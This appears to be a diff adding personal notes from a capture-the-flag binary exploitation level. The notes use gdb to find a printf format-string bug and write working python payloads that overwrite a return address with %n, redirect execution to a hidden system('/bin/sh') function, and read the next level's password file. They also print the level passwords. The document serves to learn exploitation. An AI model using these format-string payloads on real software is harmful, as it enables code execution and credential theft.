@@ -1,0 +1,102 @@
+login : pw
+	level5 : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+disas main
+	=> n called
+
+disas n
+	=> stack allocated = 0x218
+	=> esp + 0x8 => x 0x8049848 => stdin
+	=> esp + 0x4 => 0x200 => 512
+	=> esp => ebp - 0x208 => 520 (buffer size)
+	fgets called
+		=> fgets is not vulnerable
+	printf called with buffer as only param
+	exit called with 1
+
+My guess is we need to find a way to execute a command from printf
+	=> Can we use the n to rewrite our return address and points to a shell code that is input in the printf buf
+
+b *n+54
+
+r
+	=> aaaa
+
+disas n
+	=> There is the return address on the stack
+	=> this address is 0x080484f8
+
+x/32xw $esp-16
+	=> We locate the return address in 0xbffff400 + 0xc
+	=> Our buffer starts in 0xbffff420 = 3221222432
+
+python -c 'print "\x0c\xf4\xff\xbf" + "%4$p"' > /tmp/c
+	=> r => We have the address
+
+Our width must be 3221222432 - 4
+
+python -c 'print "\x0c\xf4\xff\xbf" + "%3221222428x" + "%$4n"' > /tmp/c
+	=> r => doesnt display anything
+
+I suspected the unsigned int to be a problem:
+python -c 'print "\x0c\xf4\xff\xbf" + "%221222428x" + "%$4n"' > /tmp/c
+	=> It works => I cant redirect to an address above intmax
+
+i func system
+	=> 0x080483b0  system = 134513584 < intmax
+		=> I can redirect to it
+
+I need the "/bin/sh" string
+
+info proc map
+	=> 0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.s
+
+find 0xb7e2c000, 0xffffffff, "/bin/sh"
+	=> 0xb7f8cc58 = 3086535768 > intmax
+		=> Wont work
+		=> Cant use env var neither as there are stored previously on the stack
+
+i func
+	=> 0x080484a4  o
+		=> My bad, I should have noticed this earlier
+		=> This function exists but is not called
+
+disas o
+	system called with 0x80485f0
+		=> then exit with 1
+	x/s 0x80485f0
+		=> "/bin/sh"
+			=> Ahahah, ok
+
+p/d 0x080484a4
+	=> 134513828
+
+Remember ret address was stored in 0xbffff40c
+python -c 'print "\x0c\xf4\xff\xbf" + "%134513824x" + "%4$n"' > /tmp/c
+
+r < /tmp/c
+	=> breakpoint didnt hit
+	=> So we went into o()
+		=> No shell because EOF, refer level 4
+
+Lets try outside with the stdin still open:
+	cat /tmp/c - | ./level5
+		=> Takes aegis
+		=> Display 200 => Then we are in the shell
+
+whoami
+	=> level6
+
+cat /home/user/level6/.pass
+	=> d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+
+
+
+
+
+
+
+
+
+
